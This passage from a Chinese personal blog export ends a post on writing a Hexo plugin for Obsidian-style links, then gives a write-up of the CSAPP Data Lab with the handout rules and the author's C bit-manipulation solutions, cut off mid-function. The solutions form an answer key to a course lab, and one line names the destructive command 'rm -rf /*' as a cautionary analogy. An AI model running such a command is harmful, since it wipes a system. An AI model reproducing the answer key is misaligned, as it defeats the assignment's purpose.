<li>另外写一个脚本，每次 Hexo 构建时，都去遍历一遍文章，记录文章标题与文章 front-matter 中 abbrlink 的键值关系，就像我在 <a href="#4139834099" title="Butterfly 侧边栏实现 Obsidian 关系图谱" class="record-link ">另一个项目</a> 做的那样。</li>
<li>字符串匹配，替换双链为 <code>&lt;a&gt;</code> 标签。</li>
</ol>
<p>但这会导致最终我还是整了套「工作流」，且强依赖 <code>hexo-abbrlink</code> 插件，还是很麻烦。因为我的思路还是局限于经验，不知道 Hexo 会为插件提供什么。</p>
<p>当我在找类似 Hexo 插件学习时（就像我之前写 Markdown 插件那样），找到了 <a href="https://github.com/tcatche/hexo-filter-link-post">这个项目</a>：<code>hexo-filter-link-post</code>。<code>hexo-filter-link-post</code> 将文件里的通过相对路径引用的 markdown 文件转为对应的文章的链接。源代码中使用到了两个机制：</p>
<ol>
<li>Hexo 插件本来就可以遍历每篇文章，且可以定义一个全局的类似 Map 的东西。</li>
<li>Hexo 本身就有获取当前文章的永久链接的能力，不依赖其它任何插件。</li>
<li>Hexo 提供渲染器，我可以选择在文章渲染的不同阶段中实施我想要的处理。</li>
</ol>
<p><code>hexo-filter-link-post</code> 给了我灵感，但还有改进的地方。因为它选择在文章被渲染成 html 后，对其进行正则表达式替换。这显然不够好。通过查阅官方文档和尝试，应该在文章渲染之前就开始进行替换，这更符合一般逻辑。</p>
<p>最终，我只用了一个晚上，一个更符合预期，更方便的插件就诞生啦！！！</p>
<p><a href="https://github.com/uuanqin/hexo-filter-titlebased-link"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=hexo-filter-titlebased-link" alt="Readme Card"></a></p>
<h1>先读例子再编码</h1>
<p>在写新插件的过程中，我就是抱着贯彻「先看看别人怎么写，在自己改改」的理念进行的，这与我之前认为的必须把所有理论基础过一遍才能下手的观念有些不同（详看 <a href="#3395837292" title="第一次开发 npm 插件" class="record-link ">第一次开发 npm 插件</a>）。在学校学习过程中，我们早就熟悉了先学理论再实践的方法论，比如：学习➡️考试➡️应用。但如果在文档资料稀少或时间精力紧缺的情况下，通过模仿学习别人的例子是一个更好的选择。</p>
<p>这好比要在地上一堆零件或玩具中，自己尝试拆解并搭建一个小机器人，能用就行；又或是在未知的自然界中探索和考察，通过模仿和分析去制作出人使用的工具、剖析人与自然的关系。这个过程就如同在迷雾中探索，迷茫而又艰难，但每一步也能探出能落脚的地方。</p>
<p>在前期简单调研过程中，我又发现了一个开发者明确说出「先看别人怎么写，再自己写」的例子，印证这个方法论在程序界中不是一条野生的理论，而是有用且实际的理论。这个例子的背景大概就是一个打算编写 Hexo 插件的开发者（cedric-sun）发了条 Issue 吐槽官方文档内容过少、教程过简，Hexo 官方开发人员（curbengh）解释道最好的文档就是<strong>源代码</strong>，或者可以<strong>参考已经成形的插件</strong>。</p>
<blockquote>
<p>[!cite] Improve guide on extension development <a href="https://github.com/hexojs/site/issues/1202">#1202</a><br>
<strong>cedric-sun</strong>:</p>
<blockquote>
<p>First, we have to create a Hexo instance.</p>
</blockquote>
<p>Well, seriously? You don't have to create a hexo instance if you are developing plugins, because the hexo runtime invoked from the CLI will load your script instead. That's merely the very first meaningful sentences of you API document, and it's wrong. <strong>At least please add some restriction and provide some context, and avoid making too general statements, otherwise it could be very confusing to new plugins developer.</strong></p>
<p>Some pages of the document is just brusque, like <a href="https://hexo.io/api/processor">Processor</a>.</p>
<p>Last thing. It's good we have all those API document around, but <strong>that's not a &quot;guide&quot; on extension development</strong>. Are we supposed to write our extension right in the <code>node_modules</code> directory under the hexo root? Or should we put it in some separate directory and refer to it in the <code>package.json</code> of hexo? In the latter case should we add <code>hexo</code> in <code>dependencies</code>? Or <code>devDependencies</code>? Or not at all? At least I was expecting some recommendation or pros-and-cons from the official team, not from some personal blogs.</p>
<p>I don't think that quality of developmental documentation is consistent with a 28k stars repo. Do you have any plan to improve it?</p>
<p><strong>curbengh</strong>: Transferring to <a href="https://github.com/hexojs/site">https://github.com/hexojs/site</a> as <strong>that's the source of documentation</strong>.</p>
<p><strong>curbengh</strong>: I do agree the documentation on extension development needs improvement. I initially learned plugin dev <strong>mostly by looking through the source code of existing ones and only use the doc for additional clarification. I believe most plugin devs also learned it this way.</strong> I'm not saying this approach is ideal though, it would significantly help newcomer by having more thorough examples and step-by-step guides......</p>
</blockquote>
<h1>正则表达式工程师</h1>
<p>在编写这种「语法」类型的插件，正则表达式真的绕不开。好的正则表达式能准确定位我们的需求，并有着极高的检索效率。我时常使用正则表达式编程，但更多情况下我更倾向于能不用就不用，这是因为：</p>
<ol>
<li>正则表达式过于强大，以至于我觉得它更像终极的核武器，利用得好可以发电，利用不好直接爆炸。</li>
<li>各种语言的正则表达式函数用法不尽相同，难记，我也只停留在每做一步就百度一步的阶段。</li>
</ol>
<p>我最常使用的正则编程利器：<a href="https://www.jyshare.com/front-end/854/">正则表达式在线测试 | 菜鸟工具 (jyshare.com)</a></p>
<p>对于它的使用（无论是在编程上还是笔记排版上），我也有一些自己的总结：</p>
<ol>
<li>时常使用工具验证自己的想法，常看表达式翻译后的自动机图形</li>
<li>如果仅仅是用于便利日常生活，而非写入程序（比如一些笔记使用的自动化排版脚本），编写的正则表达式覆盖痛点的主要部分即可，而不是绝大部分，不要「过拟」。</li>
<li>应用范围要可控，不要一键全局替换。这种情况堪比 <code>rm -rf /*</code>。时间允许的话可以速览即将被替换的内容。</li>
<li>在兼顾效率的情况下尽可能添加约束，比如前向预测、反向预测等。</li>
<li>将痛点分隔成不同单元，尽可能使匹配的规则更简单，并且便于配置规则的开闭。</li>
<li>时常备份，时常留下修改日志，及时察觉错误并改正。</li>
<li>为不同场景定制正则。除非是官方提供的（经过了良好测试），不要将自己写的某条正则规则不经思考引用到新的场景中。比如我的笔记中使用的正则规则，不要立即同步到博客那边，等到博客那边真的需要时再引用，以避免潜在匹配失误。</li>
</ol>
<ul>
<li>[ ] 由于它的重要性和复杂性，未来我将写一篇文章好好总结 Python、Java、JavaScript 使用常用正则函数的方法。</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">5</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></li>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2136059777">
                            <a href="#2136059777">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_archive);">⬤</span>
                                    
                                    <span style="color: var(--n_outofdate);">⬤</span>
                                    
                                </span>
                                
                                <span>Obsidian Internal links 双向链接渲染解决方案</span>
                                
                                <div class="record-links-context hover">
                                    <p>双链语法是 Obsidian 最重要的特性。一开始，我也找到了相似的插件 <code>hexo-link-obsidian</code>，但是这个插件的使用过为复杂和苛刻（详看 <a href="#2136059777" title="Obsidian Internal links 双向链接渲染解决方案" class="record-link highlight">这篇文章</a>）：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3395837292">
                            <a href="#3395837292">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次开发 npm 插件</span>
                                
                                <div class="record-links-context hover">
                                    <p>在写新插件的过程中，我就是抱着贯彻「先看看别人怎么写，在自己改改」的理念进行的，这与我之前认为的必须把所有理论基础过一遍才能下手的观念有些不同（详看 <a href="#3395837292" title="第一次开发 npm 插件" class="record-link highlight">第一次开发 npm 插件</a>）。在学校学习过程中，我们早就熟悉了先学理论再实践的方法论，比如：学习➡️考试➡️应用。但如果在文档资料稀少或时间精力紧缺的情况下，通过模仿学习别人的例子是一个更好的选择。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></li>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="4139834099">
                            <a href="#4139834099">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 侧边栏实现 Obsidian 关系图谱</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>另外写一个脚本，每次 Hexo 构建时，都去遍历一遍文章，记录文章标题与文章 front-matter 中 abbrlink 的键值关系，就像我在 <a href="#4139834099" title="Butterfly 侧边栏实现 Obsidian 关系图谱" class="record-link highlight">另一个项目</a> 做的那样。</li>
<li>字符串匹配，替换双链为 <code>&lt;a&gt;</code> 标签。</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>关于双链渲染，心路历程详见：<a href="#746142122" title="第一次写 Hexo 插件" class="record-link highlight">第一次写 Hexo 插件</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2136059777">
                            <a href="#2136059777">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_archive);">⬤</span>
                                    
                                    <span style="color: var(--n_outofdate);">⬤</span>
                                    
                                </span>
                                
                                <span>Obsidian Internal links 双向链接渲染解决方案</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!warning] 这是一篇过期文章 [2024.04.12]<br>
本篇文章已过期。</p>
<ul>
<li>本文为文章 <a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a> 中双链语法部分的分离，强烈建议使用新方法适配双向链接。</li>
<li>在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 <a href="#746142122" title="第一次写 Hexo 插件" class="record-link highlight">第一次写 Hexo 插件</a></li>
<li>这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3315008132" class="record">
            <header>
                <h1 class="record-title">CSAPP LAB-1 位操作</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CSAPP');">CSAPP</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('实验');">实验</button>
                    
                    <button class="btn" onclick="activeTag('离散数学');">离散数学</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/22/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240522202049.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>位级理解我们的代码</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c5970284</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>写完 Lab2 拆炸弹的实验解析后，打算补一下实验 1 的内容。因为感觉自己把时间投入进去了，除了有无形的成果外还要有有形的成果。再说，实验课上没要求我们写报告，没点内容沉淀感觉不自在。</p>
<blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>
<h1>实验介绍</h1>
<p>本实验主要包括一些有关位操作的编程题，我们的目标是实现这些编程题。所有要实现的代码都在 <code>bits.c</code> 文件中。</p>
<p><code>tar xvf datalab-handout.tar</code> 解压代码，包含如下文件</p>
<ul>
<li><code>bits.c</code>：唯一需要修改的文件</li>
<li><code>btest.c</code>：该文件的作用是对我们实现的 bits.c 功能的正确性行评估，</li>
<li><code>README</code>：关于 btest 的一些说明。</li>
<li><code>dlc</code>：语法检查</li>
</ul>
<p>完成后用 <code>./dlc bits.c</code> 检查 <code>bits.c</code> 的语法是否正确，就是是否按照要求使用规定数量的操作符。如果语法检查无误，那么使用 <code>make btest</code>，生成 <code>btest</code> 可执行文件，该文件检查 <code>bits.c</code> 中实现的函数功能是否与要求的一致，具体用法如下 <code>./btest</code></p>
<p>如果还需要修改 <code>bits.c</code> 那么需要 <code>make clean</code>。<code>make btest</code> 重新生成 <code>btest</code> 文件</p>
<p><code>./btest -fisPositive</code> 单独测试某一个函数</p>
<p><code>rating</code> 代表困难等级；<code>max ops</code> 代表最多可使用的操作符。</p>
<p>正确的测试结果为：</p>
<pre><code class="language-test">Score   Rating  Errors  Function
 1      1       0       bitXor
 1      1       0       tmin
 1      1       0       isTmax
 2      2       0       allOddBits
 2      2       0       negate
 3      3       0       isAsciiDigit
 3      3       0       conditional
 3      3       0       isLessOrEqual
 4      4       0       logicalNeg
 4      4       0       howManyBits
 4      4       0       floatScale2
 4      4       0       floatFloat2Int
 4      4       0       floatPower2
Total points: 36/36
</code></pre>
<h1>代码编写要求</h1>
<pre><code class="language-c">#if 0
/*
 * Instructions to Students:
 *
 * STEP 1: Read the following instructions carefully.
 */

You will provide your solution to the Data Lab by
editing the collection of functions in this source file.

INTEGER CODING RULES:
 
  Replace the &quot;return&quot; statement in each function with one
  or more lines of C code that implements the function. Your code 
  must conform to the following style:
 
  int Funct(arg1, arg2, ...) {
      /* brief description of how your implementation works */
      int var1 = Expr1;
      ...
      int varM = ExprM;

      varJ = ExprJ;
      ...
      varN = ExprN;
      return ExprR;
  }

  Each &quot;Expr&quot; is an expression using ONLY the following:
  1. Integer constants 0 through 255 (0xFF), inclusive. You are
      not allowed to use big constants such as 0xffffffff.
  2. Function arguments and local variables (no global variables).
  3. Unary integer operations ! ~
  4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;
    
  Some of the problems restrict the set of allowed operators even further.
  Each &quot;Expr&quot; may consist of multiple operators. You are not restricted to
  one operator per line.

  You are expressly forbidden to:
  1. Use any control constructs such as if, do, while, for, switch, etc.
  2. Define or use any macros.
  3. Define any additional functions in this file.
  4. Call any functions.
  5. Use any other operations, such as &amp;&amp;, ||, -, or ?:
  6. Use any form of casting.
  7. Use any data type other than int.  This implies that you
     cannot use arrays, structs, or unions.

 
  You may assume that your machine:
  1. Uses 2s complement, 32-bit representations of integers.
  2. Performs right shifts arithmetically.
  3. Has unpredictable behavior when shifting if the shift amount
     is less than 0 or greater than 31.


EXAMPLES OF ACCEPTABLE CODING STYLE:
  /*
   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31
   */
  int pow2plus1(int x) {
     /* exploit ability of shifts to compute powers of 2 */
     return (1 &lt;&lt; x) + 1;
  }

  /*
   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31
   */
  int pow2plus4(int x) {
     /* exploit ability of shifts to compute powers of 2 */
     int result = (1 &lt;&lt; x);
     result += 4;
     return result;
  }

FLOATING POINT CODING RULES

For the problems that require you to implement floating-point operations,
the coding rules are less strict.  You are allowed to use looping and
conditional control.  You are allowed to use both ints and unsigneds.
You can use arbitrary integer and unsigned constants. You can use any arithmetic,
logical, or comparison operations on int or unsigned data.

You are expressly forbidden to:
  1. Define or use any macros.
  2. Define any additional functions in this file.
  3. Call any functions.
  4. Use any form of casting.
  5. Use any data type other than int or unsigned.  This means that you
     cannot use arrays, structs, or unions.
  6. Use any floating point data types, operations, or constants.


NOTES:
  1. Use the dlc (data lab checker) compiler (described in the handout) to 
     check the legality of your solutions.
  2. Each function has a maximum number of operations (integer, logical,
     or comparison) that you are allowed to use for your implementation
     of the function.  The max operator count is checked by dlc.
     Note that assignment ('=') is not counted; you may use as many of
     these as you want without penalty.
  3. Use the btest test harness to check your functions for correctness.
  4. Use the BDD checker to formally verify your functions
  5. The maximum number of ops for each function is given in the
     header comment for each function. If there are any inconsistencies 
     between the maximum ops in the writeup and in this file, consider
     this file the authoritative source.

/*
 * STEP 2: Modify the following functions according the coding rules.
 * 
 *   IMPORTANT. TO AVOID GRADING SURPRISES:
 *   1. Use the dlc compiler to check that your solutions conform
 *      to the coding rules.
 *   2. Use the BDD checker to formally verify that your solutions produce 
 *      the correct answers.
 */


#endif
</code></pre>
<h1>实验内容</h1>
<p>所有问题的答案均不唯一。因为我也在同时学习《离散数学》所以里面用到了不少命题表达。</p>
<h2>异或的实现（难度：⭐）</h2>
<pre><code class="language-c">/* 
 * bitXor - x^y using only ~ and &amp; 
 *   Example: bitXor(4, 5) = 1
 *   Legal ops: ~ &amp;
 *   Max ops: 14
 *   Rating: 1
 */
int bitXor(int x, int y) {
  // A 异或 B
  int a = x &amp; (~y);  //10
  int b = (~x) &amp; y;  //01
  return ~((~a)&amp;(~b));  //
}
</code></pre>
<p>如果你读过《离散数学》就会知道，任意的命题公式都可以仅包含 ${ \neg,\vee }$ 或 ${ \neg,\wedge }$ 的命题公式等价代换。因为：</p>
<ol>
<li>由 $P\leftrightarrow Q \iff(P\to Q)\wedge(Q\to P)$。故我们可以把 $\leftrightarrow$ 替换为 $\to,\wedge$</li>
<li>由 $P\to Q\iff \neg P\vee Q$。故我们可以把 $\to$ 替换为 $\neg,\vee$</li>
<li>由 $P\wedge Q\iff \neg(\neg P \vee  \neg Q),P\vee Q \iff \neg(\neg P\wedge \neg Q)$，说明 $\vee,\wedge$ 可以互相转换。</li>
</ol>
<blockquote>
<p>如果定义了 $\uparrow$（与非）、$\downarrow$（或非），那么最小的联结词组亦可为 ${ \uparrow }$ 或 ${ \downarrow }$。</p>
</blockquote>
<p>那么上面的编程题就变为求只用 $\neg,\wedge$ 表示异或：</p>
<p>$$<br>
\begin{aligned}<br>
P \oplus Q &amp;  \implies (P\wedge \neg Q)\vee (\neg P \wedge Q) \<br>
&amp; \implies \neg(\neg (P\wedge \neg Q)\wedge \neg (\neg P \wedge Q))<br>
\end{aligned}<br>
$$</p>
<h2>补码的最小值（难度：⭐）</h2>
<pre><code class="language-c">/* 
 * tmin - return minimum two's complement integer 
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 4
 *   Rating: 1
 */
int tmin(void) {
  return 1&lt;&lt;31;
}
</code></pre>
<p>多翻翻书看看定义。</p>
<h2>补码的最大值（难度：⭐⭐）</h2>
<pre><code class="language-c">/*
 * isTmax - returns 1 if x is the maximum, two's complement number,
 *     and 0 otherwise 
 *   Legal ops: ! ~ &amp; ^ | +
 *   Max ops: 10
 *   Rating: 1
 */
int isTmax(int x) {
  int res = x+1;
  // 测res是不是0x80000000;
  int is_not_zero =!!((res^0x00)); // res不是0
  int is_neg_self_equals = !(((~res)+1)^res); // res 的负数等于自身
  return is_neg_self_equals&amp;is_not_zero;
}
</code></pre>
<p>补码的最大值为：<code>0x7fffffff</code>，我们可以换个思路，变成判断该数是否为补码的最小值 <code>0x80000000</code>。</p>
<p>关于补码的最小值 <code>INT_MIN</code> 有以下特点：</p>
<ul>
<li><code>INT_MIN == - INT_MIN</code></li>
<li>一个补码取反加 1 等于自身的数只有两个：<code>INT_MIN</code> 和 <code>0</code>。</li>
</ul>
<p>根据以上两点构造命题逻辑即可。</p>
<h2>所有的奇数位是否为 1（难度：⭐⭐）</h2>
<pre><code class="language-c">/* 
 * allOddBits - return 1 if all odd-numbered bits in word set to 1
 *   where bits are numbered from 0 (least significant) to 31 (most significant)
 *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 12
 *   Rating: 2
 */
int allOddBits(int x) {
  int mask = 0xAA; // 10101010.......
  mask |= mask&lt;&lt;8;
  mask |= mask&lt;&lt;16;

  x&amp;=mask;
  x|=x&gt;&gt;1;
  x=~x;
  return !x;
}
</code></pre>
<p>巧用移位和掩码。</p>
<h2>补码的非（难度：⭐⭐）</h2>
<blockquote>
<p>看过书的都知道，这也是最简单的了。</p>
</blockquote>
<pre><code class="language-c">/* 
 * negate - return -x 
 *   Example: negate(1) = -1.
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 5
 *   Rating: 2
 */
int negate(int x) {
  return (~x)+1;
}
</code></pre>
<blockquote>
<p>附一张理解补码「取反加一」的图：<img src="https://cdn.gallery.uuanqin.top/img/20240318234102.webp" alt="image.png|500"></p>
</blockquote>
<h2>是否为 ASCII 数字（难度：⭐⭐⭐）</h2>
<pre><code class="language-c">/* 
 * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')
 *   Example: isAsciiDigit(0x35) = 1.
 *            isAsciiDigit(0x3a) = 0.
 *            isAsciiDigit(0x05) = 0.
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 15
 *   Rating: 3
 */
int isAsciiDigit(int x) {
  // 0x30:  ...00110000
  // 0x39:  ...00111001
  int high_check = !((x&gt;&gt;4)^0x03); // 1 则正确
  int p3 = x&amp;0x08;
  int p2 = x&amp;0x04;
  int p1 = x&amp;0x02;
  int low_check = (!p3)|(!(p2|p1));  // p3 -&gt; !(p2|p1)
  return high_check&amp;low_check;
}
</code></pre>
<p>观察 ASCII 数字的十六进制代码可以发现，0x30 到 0x39 的特点：</p>
<ul>
<li>高 28 位一定是 0x0000003。对应上面代码的 <code>high_check</code></li>
<li>低 4 位的特点，从右往左，0 位开始计数：
<ul>
<li>如果第 3 位为 <code>0</code>，则这个数满足要求</li>
<li>如果第 3 为为 <code>1</code>，第 2 位或者第 1 位不能为 <code>1</code></li>
</ul>
</li>
</ul>
<p>代码中 <code>p3</code>-<code>p1</code> 对应命题这些位是否为 1。很容易构造出命题：</p>
<p>$$<br>
P_3 \to \neg(P_2 \vee P_1) \iff \neg P_3 \vee \neg(P_2 \vee P_1)</p>
<p>$$</p>
<h2>三元运算符（难度：⭐⭐⭐）</h2>
<pre><code class="language-c">/* 
 * conditional - same as x ? y : z 
 *   Example: conditional(2,4,5) = 4
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 16
 *   Rating: 3
 */
int conditional(int x, int y, int z) {
  int mix = y^z;
  int signal = !!x;
  signal = (signal&lt;&lt;31)&gt;&gt;31;
  return ((signal&amp;z)|((~signal)&amp;y))^mix; // y^z^y =z; z^y^z = y
}
</code></pre>
<p>两个非 <code>!</code> 操作压缩位，很容易理解，仔细想想这个操作还是挺骚气的（后面会让你使用位运算实现这个 <code>!</code> ）。</p>
<p>利用了异或的运算律：</p>
<p>$$<br>
\begin{align}<br>
a\oplus 0&amp;=a \<br>
a\oplus a &amp;= 0 \<br>
a\oplus b &amp;= b\oplus a \<br>
(a \oplus b) \oplus c &amp;= a \oplus( b \oplus c)<br>
\end{align}<br>
$$</p>
<h2>小于等于（难度：⭐⭐⭐）</h2>
<pre><code class="language-c">/* 
 * isLessOrEqual - if x &lt;= y  then return 1, else return 0 
 *   Example: isLessOrEqual(4,5) = 1.
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 24
 *   Rating: 3
 */
int isLessOrEqual(int x, int y) {
  int y_x = y  + ((~x)+1);
  int sx = (x&gt;&gt;31);//&amp;0x01;
  int sy = (y&gt;&gt;31);//&amp;0x01;
  int s_y_x = (y_x&gt;&gt;31);//&amp;0x01;
  int condition1= (!sy)&amp;(sx);
  int condition2 = (!s_y_x)&amp;!((!sx)&amp;sy); // x为正 y为负


  return condition1|condition2;
}
</code></pre>
<h2>取非（难度：⭐⭐⭐⭐）</h2>
<pre><code class="language-c">/* 
 * logicalNeg - implement the ! operator, using all of 
 *              the legal operators except !
 *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
 *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 12
 *   Rating: 4 
 */
int logicalNeg(int x) {
  int res=x;
  // 相当于把x折半压缩
  res |=  res&gt;&gt;16;
  res |=  res&gt;&gt;8;
  res |=  res&gt;&gt;4;
  res |=  res&gt;&gt;2;
  res |=  res&gt;&gt;1;  // 只要原来x任何一位存在1，当前res[0]结果就为1
  res = ~res;      // 模拟取反（我们只关心res[0]）
  res &amp;= 0x01;     // 将不关心的位清除
  return res;
}
</code></pre>
<p>其实挺简单的，使用了折半压缩的思想。</p>
<h2>需要的 bit 的个数（难度：⭐⭐⭐⭐）</h2>
<pre><code class="language-c">/* howManyBits - return the minimum number of bits required to represent x in
 *             two's complement
 *  Examples: howManyBits(12) = 5  01100
 *            howManyBits(298) = 10
 *            howManyBits(-5) = 4  1011;0100
 *            howManyBits(0)  = 1
 *            howManyBits(-1) = 1
 *            howManyBits(0x80000000) = 32
 *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *  Max ops: 90
 *  Rating: 4
 */
int howManyBits(int x) {
  int sign = x&gt;&gt;31;
  int high16,high8,high4,high2,high1,high0;

  // sign ? -x : x;
  int mix = x^(~x);
  x = ((sign&amp;(x))|((~sign)&amp;(~x)))^mix;
  
  high16 = !!(x&gt;&gt;16);
  x &gt;&gt;= (high16&lt;&lt;4);

  high8 = !!(x&gt;&gt;8);
  x &gt;&gt;= (high8&lt;&lt;3);

  high4 = !!(x&gt;&gt;4);
  x &gt;&gt;= high4&lt;&lt;2;

  high2 = !!(x&gt;&gt;2);
  x &gt;&gt;= high2&lt;&lt;1;

  high1 = !!(x&gt;&gt;1);
  x &gt;&gt;= high1;

  high0 = x; //

  return (high16&lt;&lt;4) + (high8&lt;&lt;3) + (high4&lt;&lt;2) + (high2&lt;&lt;1) + high1 + high0 + 1 ; // WHY
}
</code></pre>
<h2>浮点数翻倍（难度：⭐⭐⭐⭐）</h2>
<pre><code class="language-c">//float
/* 
 * floatScale2 - Return bit-level equivalent of expression 2*f for
 *   floating point argument f.
 *   Both the argument and result are passed as unsigned int's, but
 *   they are to be interpreted as the bit-level representation of
 *   single-precision floating point values.
 *   When argument is NaN, return argument
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
unsigned floatScale2(unsigned uf) {
  unsigned M = 0x7FFFFF&amp;uf;
  unsigned E = (uf&gt;&gt;23)&amp;0xFF;
  unsigned S = (uf&gt;&gt;31)&amp;0x01;

  if(E==0xFF){
    return uf;
  }
  if(E==0x00){
    M&lt;&lt;=1;
    return (S&lt;&lt;31)|(E&lt;&lt;23)|M;
  }
  E+=1;
  // M&lt;&lt;=1;

  return (S&lt;&lt;31)|(E&lt;&lt;23)|M;
}
</code></pre>
<h2>浮点数转换为整数（难度：⭐⭐⭐⭐）</h2>
<pre><code class="language-c">/* 
 * floatFloat2Int - Return bit-level equivalent of expression (int) f
 *   for floating point argument f.
 *   Argument is passed as unsigned int, but
 *   it is to be interpreted as the bit-level representation of a
 *   single-precision floating point value.
 *   Anything out of range (including NaN and infinity) should return
 *   0x80000000u.
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
int floatFloat2Int(unsigned uf) {
  unsigned M = 0x7FFFFF&amp;uf;
  unsigned E = (uf&gt;&gt;23)&amp;0xFF;
  unsigned S = (uf&gt;&gt;31)&amp;0x01;

  int exp = E-127;
  int res;

  if(exp&lt;0)
    return 0;

  if(exp&gt;=31)
    return 0x80000000u;

  // 不会有非规格化数的参与
  res = 1&lt;&lt;23; // 隐含位
  res |= M;
  // 确定小数点的位置
  if(exp&lt;23){
    res &gt;&gt;= (23 - exp);
  }else{
    res &lt;&lt;= (exp - 23);
  }
  // 符号位计算
  if (S)
    res = -res;
